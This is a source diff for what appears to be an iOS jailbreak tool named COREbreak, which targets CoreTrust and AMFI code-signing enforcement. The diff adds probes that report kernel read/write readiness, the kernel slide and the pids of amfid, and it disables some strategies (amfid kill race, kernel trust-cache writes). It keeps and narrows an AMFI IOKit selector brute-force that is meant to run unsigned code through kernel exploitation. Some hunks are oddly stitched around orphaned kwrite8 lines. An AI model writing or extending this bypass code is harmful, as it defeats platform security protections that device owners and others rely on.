@@ -24,6 +24,7 @@ extern int sys_cache_control(int, void *, size_t);
 #import <unistd.h>
 #import <fcntl.h>
 #import <stdlib.h>
+#import <errno.h>
 #import <fcntl.h>
 #import <unistd.h>
 
@@ -143,6 +144,80 @@ const char *coretrust_write_test_binary(void)
 
     close(fd);
     return g_test_binary_path;
+}
+
+static bool coretrust_spawn_and_wait(const char *path, const char *label)
+{
+    if (!path || access(path, X_OK) != 0) {
+        printf("[COREbreak] %s: test binary not executable: %s\n",
+               label ?: "spawn", path ?: "NULL");
+        return false;
+    }
+
+    pid_t child = 0;
+    const char *argv[] = { path, NULL };
+    int ret = posix_spawn(&child, path, NULL, NULL, (char *const *)argv, NULL);
+    printf("[COREbreak] %s: posix_spawn ret=%d pid=%d\n",
+           label ?: "spawn", ret, child);
+    if (ret != 0 || child <= 0)
+        return false;
+
+    int status = 0;
+    if (waitpid(child, &status, 0) < 0) {
+        printf("[COREbreak] %s: waitpid failed errno=%d\n", label ?: "spawn", errno);
+        return false;
+    }
+
+    bool ok = (WIFEXITED(status) && WEXITSTATUS(status) == 0);
+    printf("[COREbreak] %s: exit status=0x%x ok=%s\n",
+           label ?: "spawn", status, ok ? "YES" : "NO");
+    return ok;
+}
+
+bool coretrust_direct_execution_probe(void)
+{
+    printf("[COREbreak] === [Strategy 0] Direct execution probe ===\n");
+    const char *testPath = coretrust_write_test_binary();
+    if (!testPath) {
+        printf("[COREbreak] direct probe: failed to create test binary\n");
+        return false;
+    }
+    return coretrust_spawn_and_wait(testPath, "direct probe");
+}
+
+bool coretrust_preflight_checks(void)
+{
+    printf("[COREbreak] === [Preflight] CoreTrust stability checks ===\n");
+    NSString *version = [[UIDevice currentDevice] systemVersion] ?: @"unknown";
+    printf("[COREbreak] iOS version: %s\n", version.UTF8String);
+    printf("[COREbreak] KRW ready: %s\n", kexploit_krw_ready() ? "YES" : "NO");
+    printf("[COREbreak] kernel base: 0x%llx slide: 0x%llx\n", g_kernel_base, g_kernel_slide);
+
+    const char *testPath = coretrust_write_test_binary();
+    printf("[COREbreak] test binary: %s (%s)\n",
+           testPath ?: "NULL",
+           (testPath && access(testPath, X_OK) == 0) ? "executable" : "not executable");
+
+    int amfidPid = find_pid_by_name("amfid");
+    int msmPid = find_pid_by_name("MobileStorageMounter");
+    printf("[COREbreak] amfid pid: %d\n", amfidPid);
+    printf("[COREbreak] MobileStorageMounter pid: %d\n", msmPid);
+
+    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault,
+        IOServiceMatching("AppleMobileFileIntegrity"));
+    if (!service) {
+        printf("[COREbreak] AMFI IOKit service: missing\n");
+        return false;
+    }
+
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
+    printf("[COREbreak] AMFI IOKit open type=0: 0x%x\n", kr);
+    if (conn)
+        IOServiceClose(conn);
+    IOObjectRelease(service);
+
+    return (testPath && amfidPid > 0);
 }
 
 // ===========================================================================
@@ -394,6 +469,14 @@ bool coretrust_amfi_enforcement_flags_zero(void)
 
 bool coretrust_kill_amfid_race(const char *testBinPath)
 {
+    (void)testBinPath;
+    printf("[COREbreak] === [Strategy 3] amfid kill + race ===\n");
+    printf("[COREbreak] skipped: killing amfid is unstable and can panic/reboot devices\n");
+    crash_write("[COREbreak] skipped amfid kill race\n");
+    return false;
+}
+
+#if 0
     printf("[COREbreak] === [Step 4/6] Strategy 3: amfid kill + race ===\n");
     if (!testBinPath || access(testBinPath, X_OK) != 0) {
         printf("[COREbreak] test binary not executable: %s\n", testBinPath ?: "NULL");
@@ -440,6 +523,8 @@ bool coretrust_kill_amfid_race(const char *testBinPath)
     return false;
 }
 
+#endif
+
 // ===========================================================================
 // Helper: build TC data from global test binary
 // ===========================================================================
@@ -465,12 +550,13 @@ typedef enum {
     kIOKitCallTrap,
 } IOkitCallType;
 
-#define MAX_IOCKIT_SEL 256
+static const uint32_t kCoreTrustSafeSelectors[] = { 0, 1, 2, 3, 4, 5, 6, 7 };
 
 static bool coretrust_try_iokit_conn(io_connect_t conn, const uint8_t *tcData,
                                      size_t tcSize, uint32_t type)
 {
-    for (uint32_t sel = 0; sel < MAX_IOCKIT_SEL; sel++) {
+    for (size_t i = 0; i < sizeof(kCoreTrustSafeSelectors) / sizeof(kCoreTrustSafeSelectors[0]); i++) {
+        uint32_t sel = kCoreTrustSafeSelectors[i];
         size_t outSize = sizeof(uint32_t);
         uint32_t outVal = 0;
         kern_return_t kr = IOConnectCallStructMethod(conn, sel, tcData, tcSize,
@@ -479,20 +565,6 @@ static bool coretrust_try_iokit_conn(io_connect_t conn, const uint8_t *tcData,
             printf("[COREbreak] TXM loaded: type=%u sel=%u (StructMethod)\n",
                    type, sel);
             crash_write("[COREbreak] TXM via StructMethod\n");
-            return true;
-        }
-    }
-
-    for (uint32_t sel = 0; sel < MAX_IOCKIT_SEL; sel++) {
-        size_t outSize = sizeof(uint32_t);
-        uint32_t outVal = 0;
-        kern_return_t kr = IOConnectCallMethod(conn, sel, NULL, 0,
-                                               tcData, tcSize,
-                                               NULL, NULL, &outVal, &outSize);
-        if (kr == KERN_SUCCESS) {
-            printf("[COREbreak] TXM loaded: type=%u sel=%u (CallMethod)\n",
-                   type, sel);
-            crash_write("[COREbreak] TXM via CallMethod\n");
             return true;
         }
     }
@@ -508,8 +580,8 @@ static bool coretrust_try_iokit_conn(io_connect_t conn, const uint8_t *tcData,
 
 bool coretrust_txm_bypass(void)
 {
-    printf("[COREbreak] === [Strategy 6] TXM IOKit brute-force ===\n");
-    crash_write("[COREbreak] Strategy 6: TXM IOKit brute-force\n");
+    printf("[COREbreak] === [Strategy 6] TXM IOKit probe ===\n");
+    crash_write("[COREbreak] Strategy 6: TXM IOKit probe\n");
 
     size_t tcSize = 0;
     uint8_t *tcData = coretrust_build_tc_from_test(&tcSize);
@@ -526,15 +598,15 @@ bool coretrust_txm_bypass(void)
         return false;
     }
 
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
     bool loaded = false;
-    for (uint32_t type = 0; type < 3 && !loaded; type++) {
-        io_connect_t conn = 0;
-        kern_return_t kr = IOServiceOpen(service, mach_task_self(), type, &conn);
-        if (kr != KERN_SUCCESS || !conn) continue;
-
-        printf("[COREbreak] AMFI IOKit type=%u conn=0x%x\n", type, conn);
-        loaded = coretrust_try_iokit_conn(conn, tcData, tcSize, type);
+    if (kr == KERN_SUCCESS && conn) {
+        printf("[COREbreak] AMFI IOKit type=0 conn=0x%x\n", conn);
+        loaded = coretrust_try_iokit_conn(conn, tcData, tcSize, 0);
         IOServiceClose(conn);
+    } else {
+        printf("[COREbreak] AMFI IOKit open failed: 0x%x\n", kr);
     }
 
     IOObjectRelease(service);
@@ -561,6 +633,13 @@ bool coretrust_txm_bypass(void)
 
 bool coretrust_kernel_tc_inject(void)
 {
+    printf("[COREbreak] === [Strategy 7] Kernel trust cache injection ===\n");
+    printf("[COREbreak] skipped: direct kernel trust-cache writes are disabled for stability\n");
+    crash_write("[COREbreak] skipped kernel TC injection\n");
+    return false;
+}
+
+#if 0
     printf("[COREbreak] === [Strategy 7] Kernel trust cache injection ===\n");
     crash_write("[COREbreak] Strategy 7: kernel TC injection\n");
 
@@ -666,6 +745,8 @@ bool coretrust_kernel_tc_inject(void)
 
     return injected;
 }
+#endif
+#if 0
                 kwrite8(entryOffset + i, ourEntry[i]);
             kwrite8(entryOffset + CS_CDHASH_LEN, ourEntry[CS_CDHASH_LEN]);     // hash_type
             kwrite8(entryOffset + CS_CDHASH_LEN + 1, ourEntry[CS_CDHASH_LEN + 1]); // flags
@@ -688,6 +769,7 @@ bool coretrust_kernel_tc_inject(void)
 
     return injected;
 }
+#endif
 
 // ===========================================================================
 // Strategy 8: RemoteCall via Mach API (SPTM-safe)
@@ -798,8 +880,8 @@ bool coretrust_bypass_all(void)
     }
 
     // [Step 5/5]: Strategy 6 — TXM bypass (comprehensive IOKit brute-force)
-    printf("[COREbreak] [Step 5/7] TXM bypass (IOKit types 0-7)...\n");
-    crash_write("[COREbreak] Step 5/7: TXM IOKit\n");
+    printf("[COREbreak] [Step 5/7] TXM bypass (narrow IOKit probe)...\n");
+    crash_write("[COREbreak] Step 5/7: TXM IOKit probe\n");
     if (coretrust_txm_bypass()) {
         if (verify()) {
             printf("[COREbreak] ✅✅✅ Unsigned code executed via TXM IOKit!\n");
